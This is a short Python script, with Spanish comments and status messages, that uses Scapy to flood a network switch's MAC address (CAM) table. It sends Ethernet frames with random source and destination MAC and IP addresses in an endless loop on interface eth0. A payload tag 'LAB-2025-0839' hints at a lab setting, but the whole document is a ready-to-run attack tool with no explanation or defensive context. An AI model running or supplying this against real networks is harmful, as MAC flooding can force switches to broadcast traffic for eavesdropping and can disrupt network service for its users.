#!/usr/bin/env python3
from scapy.all import *

print("[*] Iniciando saturación de tabla CAM (MAC Flooding)...")

# Utiliza la función nativa de Scapy para generar bucles de alta velocidad
pkt = Ether(src=RandMAC(), dst=RandMAC())/IP(src=RandIP(), dst=RandIP())/"LAB-2025-0839"

try:
    sendp(pkt, iface="eth0", loop=1, verbose=False)
except KeyboardInterrupt:
    print("\n[-] MAC Flooding detenido.")

